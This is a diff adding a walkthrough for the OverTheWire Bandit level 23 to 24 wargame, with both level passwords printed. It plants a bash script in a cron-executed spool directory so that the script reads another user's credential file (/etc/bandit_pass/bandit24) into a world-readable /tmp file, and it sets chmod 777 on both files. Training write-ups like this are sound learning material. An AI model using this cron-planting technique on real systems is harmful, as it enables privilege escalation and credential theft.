@@ -1,0 +1,39 @@
+cmdit: ssh -p 2220 bandit23@bandit.labs.overthewire.org
+password: 0Zf11ioIjMVN551jX3CmStKLYqjk54Ga
+
+cmdit: cd /etc/cron.d
+cmdit: ls
+cmdit: cat cronjob_bandit24
+cmdit: cat /usr/bin/cronjob_bandit24.sh
+Here we get a script which says that in directory /var/spool/bandit24/foo, everything other than '.' and '..' gets executed and deleted.
+So, it goes through each file and folder and checks if the owner is bandit23, if it yes, it  timeouts for 60 seconds, if not, it keeps deleting.
+
+So, now we need to create a script, which copies the password from the file which contains it from bandit24 and save it on the localhost.
+
+cmdit: mkdir /tmp/sspam
+cmdit: cd /tmp/sspam
+cmdit: nano script.sh
+Write the below in the file and save it.
+#!/bin/bash
+cat /etc/bandit_pass/bandit24 > /tmp/sspam/pass
+
+Now we need to create the file, where the password is being saved.
+cmdit: touch pass
+
+Now give permissions to both the files
+
+cmdit: chmod 777 -R script.sh
+cmdit: chmod 777 -R pass
+These lines give full permissions to read, write and execute to any user.
+
+cmdit: cp script.sh /var/spool/bandit24/foo
+cmdit: ls -l
+Here we see that pass file is empty right now, wait for some time or minute at max.
+
+cmdit: ls -l
+Now we see that there is something written in the file.
+
+cmdit: cat pass
+This gives you password for next bandit.
+
+password: gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8
